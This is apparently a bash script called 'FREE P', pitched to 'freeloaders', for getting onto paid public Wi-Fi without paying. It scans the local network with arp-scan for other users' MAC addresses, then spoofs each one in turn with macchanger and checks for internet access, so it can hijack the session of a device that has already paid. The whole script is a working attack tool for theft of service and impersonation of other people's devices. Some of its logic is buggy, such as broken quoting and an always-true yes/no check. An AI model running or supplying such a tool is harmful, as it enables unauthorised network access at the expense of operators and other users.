#! /bin/bash
banner(){
echo "

───────────────────────────────────────────────────────────────────────────────────
─██████████████─████████████████───██████████████─██████████████────██████████████─
─██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░██────██░░░░░░░░░░██─
─██░░██████████─██░░████████░░██───██░░██████████─██░░██████████────██░░██████░░██─
─██░░██─────────██░░██────██░░██───██░░██─────────██░░██────────────██░░██──██░░██─
─██░░██████████─██░░████████░░██───██░░██████████─██░░██████████────██░░██████░░██─
─██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░██────██░░░░░░░░░░██─
─██░░██████████─██░░██████░░████───██░░██████████─██░░██████████────██░░██████████─
─██░░██─────────██░░██──██░░██─────██░░██─────────██░░██────────────██░░██─────────
─██░░██─────────██░░██──██░░██████─██░░██████████─██░░██████████────██░░██─────────
─██░░██─────────██░░██──██░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██────██░░██─────────
─██████─────────██████──██████████─██████████████─██████████████────██████─────────
───────────────────────────────────────────────────────────────────────────────────
				©Yada 2022
"
sleep 1
clear
}

banner
echo "Welcome Freeloader To your Premium Lifestyle"
echo "
	[1] Scan users with internet [◉]
	[2] Select user from [online.txt] [◉]
	[work in progress -- connect to public pay network then run script] [◉]
		
..............................................................................
"
Red='\033[1;31m'
Yellow='\033[1;33m'   
reset="\e[0m"
echo -e "Enter ${Red}selected number${reset} and hit enter:"
read action_1
#echo "Enter the wifi name to exploit"
#read wifiname_1
#wifiname_1= read -r
#if [[ -d /tmp/freep ]];then
#	rm -rf /tmp/freep
#else
	#mkdir /tmp/freep
#	echo ""
#fi

select_point(){
	if [[ -f /tmp/freep/online.txt ]]; then
		output=$(cat /tmp/freep/online.txt | fzf)
		interface=$(head -1 /tmp/freep/allusers.txt | sed 's/,//')
		nmcli radio wifi off
		sudo macchanger --mac=${output} $interface &>/dev/null
		nmcli radio wifi on
		echo "Happy hacking"
		
	else
		echo "hell no"
	fi
}
kill_wifi(){
	#debug_command echo "turning off"
	nmcli radio wifi off
	#sleep 10
}

wake_wifi(){
	#debug_command echo "turning on"
	nmcli radio wifi on
	#sleep 10
}

if [[ "$action_1" -eq 1 ]]; then
	sudo arp-scan -l | awk '/.*:.*:.*:.*:.*:.*/{print $2}' >> /tmp/freep/allusers.txt
	tail -n +2 /tmp/freep/allusers.txt >> /tmp/freep/users
	wc -l /tmp/freep/users
	input="/tmp/freep/users"
	interface=$(head -1 /tmp/freep/allusers.txt | sed 's/,//')
	while IFS= read -r user
	do
		kill_wifi
		sudo macchanger --mac=${user} $interface &>/dev/null
		wake_wifi
		echo " Checking internet connectivity on $user"
		nmcli dev wifi connect $"{wifiname_1"} ${interface} &>/dev/null
		sleep 11
		#ping -c3 google.com
		wget -q --tries=10 --timeout=10 --spider https://google.com
		if [[ "$?" -eq "0" ]]; then
			echo "[✔] ${Red}Internet available${reset}"
			echo "$user" >> /tmp/freep/online.txt
		else
			echo "[◉] ${Yellow}No internet connection${reset}"
		fi
	done < "$input"
	echo "Continue with part 2 of the script and select an online point [y/n] "
	read part2
	if [[ $part2 -eq y || yes || Y || Y ]]; then
		echo "This part executed"
		select_point
	else
		echo ""
	fi
else
	if [[ $action_1 -eq 2 ]]; then
		select_point
	else
		echo "Nothing to do here"
	fi
fi

